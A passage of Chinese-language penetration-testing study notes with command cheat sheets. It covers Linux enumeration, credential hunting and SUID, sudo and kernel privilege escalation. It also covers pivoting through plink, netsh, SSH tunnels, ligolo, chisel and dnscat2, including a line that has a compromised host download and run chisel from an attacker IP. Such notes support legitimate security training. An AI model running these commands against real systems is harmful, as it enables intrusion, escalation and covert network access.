</span></span><span class="line"><span class="cl">	<span class="c1">## 挂载的目录</span>
</span></span><span class="line"><span class="cl">		mount
</span></span><span class="line"><span class="cl">		cat /etc/fstab
</span></span><span class="line"><span class="cl">		lsblk <span class="c1">##所有可用磁盘</span>
</span></span><span class="line"><span class="cl">	<span class="c1">## 加载的内核</span>
</span></span><span class="line"><span class="cl">		lsmod
</span></span><span class="line"><span class="cl">		/sbin/modinfo 内核名  <span class="c1">##内核信息</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="泄漏的机密信息"><a href="#泄漏的机密信息" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>泄漏的机密信息</h3>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## 敏感文件</span>
</span></span><span class="line"><span class="cl">	env 
</span></span><span class="line"><span class="cl">	.bashrc
</span></span><span class="line"><span class="cl"><span class="c1">###当前用户允许执行的命令</span>
</span></span><span class="line"><span class="cl">    sudo -l 
</span></span><span class="line"><span class="cl"><span class="c1">###管理员账户可以使用-i切换至root</span>
</span></span><span class="line"><span class="cl">    sudo -i
</span></span><span class="line"><span class="cl"><span class="c1">### 我们将最小和最大长度设置为6个字符，使用-t参数指定模式，然后将前三个字符硬编码为Lab，后跟三个数字</span>
</span></span><span class="line"><span class="cl">	crunch  <span class="m">6</span> <span class="m">7</span> -t Lab%%% &gt; asd.txt
</span></span><span class="line"><span class="cl">	hydra
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 进程</span>
</span></span><span class="line"><span class="cl">	watch -n <span class="m">1</span> <span class="s2">&#34;ps -aux | grep pass&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">## 流量</span>
</span></span><span class="line"><span class="cl">	sudo tcpdump -i lo -A <span class="p">|</span> grep <span class="s2">&#34;pass&#34;</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="linux不安全的组件"><a href="#linux不安全的组件" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>linux不安全的组件</h3>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">---------
</span></span><span class="line"><span class="cl"><span class="c1">## 特殊权限滥用</span>
</span></span><span class="line"><span class="cl"><span class="c1">### suid</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### 寻找</span>
</span></span><span class="line"><span class="cl">		find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
</span></span><span class="line"><span class="cl">	<span class="c1">### 利用，如果find带s权限，正确执行命令后带-exec....</span>
</span></span><span class="line"><span class="cl">		find /home/joe/Desktop -exec <span class="s2">&#34;/usr/bin/bash&#34;</span> -p <span class="se">\;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### Capabilities 保留的管理员特权 好用</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### 寻找</span>
</span></span><span class="line"><span class="cl">		/usr/sbin/getcap -r / 2&gt;/dev/null
</span></span><span class="line"><span class="cl">	<span class="c1">### 利用</span>
</span></span><span class="line"><span class="cl">		https://gtfobins.github.io/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">---------
</span></span><span class="line"><span class="cl"><span class="c1">## sudo滥用</span>
</span></span><span class="line"><span class="cl"><span class="c1">### 找允许执行的命令  </span>
</span></span><span class="line"><span class="cl">	sudo -l
</span></span><span class="line"><span class="cl"><span class="c1">### 利用方式，gtf上找对应命令的提权 AppArmor内核模块执行MAC策略以进一步保护系统 </span>
</span></span><span class="line"><span class="cl">	https://gtfobins.github.io/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">--------
</span></span><span class="line"><span class="cl"><span class="c1">## 内核洞</span>
</span></span><span class="line"><span class="cl">	searchsploit搜索  
</span></span><span class="line"><span class="cl">	ps:
</span></span><span class="line"><span class="cl">		cat /etc/issue 系统类型
</span></span><span class="line"><span class="cl">		uname -r       内核版本
</span></span><span class="line"><span class="cl">		arch           系统架构
</span></span><span class="line"><span class="cl">		<span class="c1">### 过滤 -v反选</span>
</span></span><span class="line"><span class="cl">		searchsploit <span class="s2">&#34;linux kernel Ubuntu 16 Local Privilege Escalation&#34;</span>   <span class="p">|</span> grep  <span class="s2">&#34;4.&#34;</span> <span class="p">|</span> grep -v <span class="s2">&#34; &lt; 4.4.0&#34;</span> <span class="p">|</span> grep -v <span class="s2">&#34;4.8&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="c1">### 在目标机器编译</span>
</span></span><span class="line"><span class="cl">		
</span></span></code></pre></td></tr></table></div>
</div>
</div><h2 id="端口重定向和ssh隧道"><a href="#端口重定向和ssh隧道" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>端口重定向和SSH隧道</h2>
<h3 id="win端口重定向"><a href="#win端口重定向" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>win端口重定向</h3>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-------
</span></span><span class="line"><span class="cl"><span class="c1">## ssh </span>
</span></span><span class="line"><span class="cl">	%systemdrive%<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\O</span>penSSH 
</span></span><span class="line"><span class="cl">	远程动态转发
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-------
</span></span><span class="line"><span class="cl"><span class="c1">## plink  /usr/share/windows-resources/binaries/plink.exe</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### 想要访问JS的3389 直接用第二个</span>
</span></span><span class="line"><span class="cl">	JS: C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>link.exe -ssh -l kali -pw &lt;YOUR PASSWORD HERE&gt; -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4 
</span></span><span class="line"><span class="cl">	<span class="c1">### 需要输入y的情况  直接用这个 </span>
</span></span><span class="line"><span class="cl">	cmd.exe /c <span class="nb">echo</span> y <span class="p">|</span> .<span class="se">\p</span>link.exe -ssh -l root -pw pass -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-------
</span></span><span class="line"><span class="cl"><span class="c1">## netsh  条件：有管理员权限 不是管理员的话要考虑UAC</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### JS上添加转发规则</span>
</span></span><span class="line"><span class="cl">	netsh interface portproxy add v4tov4 <span class="nv">listenport</span><span class="o">=</span><span class="m">2222</span> <span class="nv">listenaddress</span><span class="o">=</span>JSIP <span class="nv">connectport</span><span class="o">=</span><span class="m">22</span> <span class="nv">connectaddress</span><span class="o">=</span>targetIP
</span></span><span class="line"><span class="cl">	<span class="c1">### 防火墙添加放行入站端口规则</span>
</span></span><span class="line"><span class="cl">	netsh advfirewall firewall add rule <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;port_forward_ssh_2222&#34;</span> <span class="nv">protocol</span><span class="o">=</span>TCP <span class="nv">dir</span><span class="o">=</span>in <span class="nv">localip</span><span class="o">=</span>JSIP <span class="nv">localport</span><span class="o">=</span><span class="m">2222</span> <span class="nv">action</span><span class="o">=</span>allow
</span></span><span class="line"><span class="cl">	<span class="c1">### 防火墙删除规则</span>
</span></span><span class="line"><span class="cl">	netsh advfirewall firewall delete rule <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;port_forward_ssh_2222&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### 删除转发规则</span>
</span></span><span class="line"><span class="cl">	netsh interface portproxy del v4tov4 <span class="nv">listenport</span><span class="o">=</span><span class="m">2222</span> <span class="nv">listenaddress</span><span class="o">=</span>JSIP
</span></span><span class="line"><span class="cl">	<span class="c1">### 查看监听的port</span>
</span></span><span class="line"><span class="cl">	netstat -anp TCP <span class="p">|</span> find <span class="s2">&#34;2222&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### 查看存在的porxy</span>
</span></span><span class="line"><span class="cl">	netsh interface portproxy show all
</span></span><span class="line"><span class="cl">	
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="linux-端口重定向和ssh隧道z"><a href="#linux-端口重定向和ssh隧道z" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>linux 端口重定向和SSH隧道z</h3>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">在本地和动态端口转发中，监听端口绑定到SSH客户端；
</span></span><span class="line"><span class="cl">而在远程端口转发中，监听端口绑定到SSH服务器。
</span></span><span class="line"><span class="cl">远程端口转发不同于SSH服务器进行数据包转发，而是由SSH客户端进行数据包转发。
</span></span><span class="line"><span class="cl">--------
</span></span><span class="line"><span class="cl"><span class="c1">## 端口转发</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### socat linux不自带/usr/share/tunnel/linux/</span>
</span></span><span class="line"><span class="cl">		socat -ddd TCP-LISTEN:22,fork TCP:10.1.1.4:22
</span></span><span class="line"><span class="cl">	<span class="c1">### rinetd 长期端口转发</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### Netcat and a FIFO</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### iptables</span>
</span></span><span class="line"><span class="cl">--------
</span></span><span class="line"><span class="cl"><span class="c1">## ssh隧道python3 -c &#39;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### 本地 缺点一次只能转发一个端口</span>
</span></span><span class="line"><span class="cl">		python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">		JS: ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
</span></span><span class="line"><span class="cl">	<span class="c1">### 动态 将流量转发到ssh服务器可以访问的任何地方</span>
</span></span><span class="line"><span class="cl">		python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">		JS: ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
</span></span><span class="line"><span class="cl">		proxychains JSip port
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">	<span class="c1">### 远程 远程是由SSH客户端进行数据包转发。入站流量受限制时使用</span>
</span></span><span class="line"><span class="cl">		python3 -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">		JS: ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4     <span class="c1">###2345会在kali上监听</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### 动态远程  OpenSSH客户端大于7.6</span>
</span></span><span class="line"><span class="cl">		python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">		JS: ssh -N -R <span class="m">9998</span> kali@192.168.118.4
</span></span><span class="line"><span class="cl">		proxychains 127.0.0.1 <span class="m">9998</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### sshuttle </span>
</span></span><span class="line"><span class="cl">		条件SSH客户端（JS）具有root权限，并且SSH服务器上需要安装Python3，适合内网复杂情况。会自动在kali添加路由，可以直接访问子网
</span></span><span class="line"><span class="cl">		socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</span></span><span class="line"><span class="cl">		sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
</span></span></code></pre></td></tr></table></div>
</div>
</div><h2 id="深度包检测-dpi"><a href="#深度包检测-dpi" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>深度包检测 DPI</h2>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## ligolo</span>
</span></span><span class="line"><span class="cl">ip tuntap add user root  mode tun ligolo
</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> ligolo up
</span></span><span class="line"><span class="cl">kali&gt; ligolo -selfcert 
</span></span><span class="line"><span class="cl">agent&gt; .<span class="se">\l</span>igolo-agent-win.exe -ignore-cert -connect 192.168.45.216:11601
</span></span><span class="line"><span class="cl"><span class="c1">### start! </span>
</span></span><span class="line"><span class="cl">session&gt; start
</span></span><span class="line"><span class="cl"><span class="c1">### 添加想要的路由</span>
</span></span><span class="line"><span class="cl">kali&gt; ip route add 10.10.99.0/24 dev ligolo	
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">配置内网反连至kali
</span></span><span class="line"><span class="cl">	ligolo&gt;
</span></span><span class="line"><span class="cl">		listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80
</span></span><span class="line"><span class="cl">		listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443
</span></span><span class="line"><span class="cl">		listener_add --addr 0.0.0.0:1111 --to 127.0.0.1:1111
</span></span><span class="line"><span class="cl">		listener_add --addr 0.0.0.0:3306 --to 127.0.0.1:3306
</span></span><span class="line"><span class="cl">	vic&gt; curl js_ip:1234
</span></span><span class="line"><span class="cl"><span class="c1">### 删网卡</span>
</span></span><span class="line"><span class="cl">ifconfig ligolo down <span class="o">&amp;&amp;</span> sudo ip link delete ligolo
</span></span><span class="line"><span class="cl">ss -antlp <span class="p">|</span> grep <span class="m">11601</span> 
</span></span><span class="line"><span class="cl"><span class="nb">kill</span> -9 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-------
</span></span><span class="line"><span class="cl"><span class="c1">## http  只允许http流量的情况</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### chisel /usr/share/tunnel/win</span>
</span></span><span class="line"><span class="cl">		kali: chisel server --port <span class="m">1080</span> --reverse
</span></span><span class="line"><span class="cl">		JS: wget 192.168.45.190:1111/chisel -O /tmp/chisel <span class="o">&amp;&amp;</span> chmod +x /tmp/chisel
</span></span><span class="line"><span class="cl">		JS:/tmp/chisel client 192.168.45.216:1080 R:socks &gt; /dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>   <span class="c1">###默认在1080监听 proxychains 127.0.0.1 1080</span>
</span></span><span class="line"><span class="cl">		使用：
</span></span><span class="line"><span class="cl">			<span class="c1">### proxychains </span>
</span></span><span class="line"><span class="cl">				socks5 127.0.0.1 <span class="m">1080</span>
</span></span><span class="line"><span class="cl">			<span class="c1">### ssh原生socks </span>
</span></span><span class="line"><span class="cl">				ssh -o <span class="nv">ProxyCommand</span><span class="o">=</span><span class="s1">&#39;ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p&#39;</span> database_admin@10.4.50.215
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-------
</span></span><span class="line"><span class="cl"><span class="c1">## dns</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### dnscat2  /usr/share/tunnel/dns/</span>
</span></span><span class="line"><span class="cl">		权威域名服务器：dnscat2-server feline.corp
</span></span><span class="line"><span class="cl">		JS:./dnscat feline.corp
</span></span><span class="line"><span class="cl">		权威: 
</span></span><span class="line"><span class="cl">			windows 
</span></span><span class="line"><span class="cl">			windows -i 序号
</span></span><span class="line"><span class="cl">			?
</span></span><span class="line"><span class="cl">			listen --help
